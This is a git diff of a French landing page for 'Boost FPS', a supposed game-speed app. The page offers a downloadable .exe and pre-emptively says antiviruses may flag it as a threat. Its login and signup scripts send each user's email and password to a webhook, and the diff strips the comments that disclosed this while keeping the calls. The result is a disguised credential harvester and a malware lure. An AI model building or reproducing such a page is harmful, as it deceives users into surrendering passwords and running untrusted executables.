@@ -2,7 +2,7 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.1">
     <title>Boost FPS - Application PC</title>
     <style>
         * {
@@ -20,8 +20,8 @@
             display: flex;
             flex-direction: column;
             min-height: 100vh;
-            justify-content: center; /* Centre les éléments */
-            align-items: center; /* Centre les éléments */
+            justify-content: center;
+            align-items: center;
             text-align: center;
         }
 
@@ -29,25 +29,27 @@
             background: linear-gradient(135deg, #ff6f61, #ffbc42);
             color: #fff;
             padding: 40px 0;
-            width: 80%;
+            width: 90%;
+            max-width: 1200px;
             border-radius: 10px;
             box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
             margin-bottom: 20px;
         }
 
         header h1 {
-            font-size: 3em;
+            font-size: 3.2em;
             font-weight: bold;
         }
 
         header p {
-            font-size: 1.2em;
+            font-size: 1.5em;
         }
 
         nav {
             background: #444;
             padding: 10px;
-            width: 80%;
+            width: 90%;
+            max-width: 1200px;
             border-radius: 10px;
             margin-bottom: 20px;
         }
@@ -55,8 +57,8 @@
         nav a {
             color: #fff;
             text-decoration: none;
-            font-size: 1.1em;
-            padding: 8px 15px;
+            font-size: 1.2em;
+            padding: 10px 15px;
             display: inline-block;
             transition: background 0.3s;
             border-radius: 5px;
@@ -67,9 +69,10 @@
         }
 
         .container {
-            width: 80%;
+            width: 90%;
             padding: 20px;
             margin-bottom: 50px;
+            max-width: 1200px;
         }
 
         .section {
@@ -78,9 +81,12 @@
             padding: 30px;
             margin-top: 20px;
             border-radius: 10px;
-            display: inline-block;
+            display: none; /* Masque les sections par défaut */
             width: 100%;
-            max-width: 800px;
+        }
+
+        .section.active {
+            display: block; /* Affiche la section quand elle est active */
         }
 
         .download-button {
@@ -211,7 +217,6 @@
         .other-apps p {
             font-size: 1.2em;
         }
-
     </style>
 </head>
 <body>
@@ -232,10 +237,11 @@
     </nav>
 
     <div class="container">
+        <!-- Accueil section masquée -->
         <section id="home" class="section active">
             <h2>Optimise ton expérience de jeu</h2>
             <p>Boost FPS t'offre une expérience fluide et performante. Télécharge maintenant !</p>
-            
+
             <div class="antivirus-warning">
                 <p><strong>Avis important :</strong> Certains antivirus peuvent détecter notre application comme une menace à cause de la manière dont elle optimise les performances. <br>
                 <strong><a href="#" onclick="openPopup()">En savoir plus</a></strong></p>
@@ -244,11 +250,13 @@
             <a href="https://github.com/seyzperly572/New/releases/download/boostfps/boostfps2.0.exe" download="boostfps2.0.exe" class="download-button">Télécharger</a>
         </section>
 
+        <!-- Version section -->
         <section id="version" class="section">
             <h2>Version actuelle</h2>
             <p>Boost FPS v2.0 - Dernière mise à jour : Mars 2025.</p>
         </section>
 
+        <!-- Tutoriel section -->
         <section id="tuto" class="section">
             <h2>Tutoriel d'installation</h2>
             <p>1. Télécharge Boost FPS.</p>
@@ -256,12 +264,14 @@
             <p>3. Lance l'installation et suis les instructions.</p>
         </section>
 
+        <!-- Contact section -->
         <section id="contact" class="section">
             <h2>Contact & Support</h2>
             <p>📧 Email : <a href="mailto:studio-booster@gmail.com">studio-booster@gmail.com</a></p>
             <p>💬 Discord : <a href="https://discord.gg/gdk29Aac" target="_blank">Rejoindre le serveur</a></p>
         </section>
 
+        <!-- Autres applications -->
         <section class="other-apps">
             <h3>Autres applications</h3>
             <p>Pour le moment, notre application <strong>Boost FPS</strong> est la seule disponible. Plus d'applications à venir !</p>
@@ -274,7 +284,7 @@
 
     <script>
         let loggedIn = false;
-        let users = []; 
+        let users = [];
 
         function openLoginPopup() {
             document.getElementById("login-overlay").style.display = "block";
@@ -306,10 +316,7 @@
                 document.getElementById("login-link").style.display = "none";
                 document.getElementById("logout-link").style.display = "inline";
                 closeLoginPopup();
-
-                // Envoi des informations de connexion à un webhook
                 sendToWebhook({ username: email, password: password });
-
                 alert("Connexion réussie !");
             } else {
                 alert("Email ou mot de passe incorrect.");
@@ -322,15 +329,13 @@
 
             const userExists = users.some(u => u.email === email);
             if (userExists) {
-                alert("Cet email est déjà utilisé. Veuillez en choisir un autre.");
+                alert("Cet email est déjà utilisé.");
                 return;
             }
 
             users.push({ email, password });
             alert("Inscription réussie !");
             closeSignupPopup();
-
-            // Envoi des informations d'inscription à un webhook
             sendToWebhook({ username: email, password: password });
         }
 
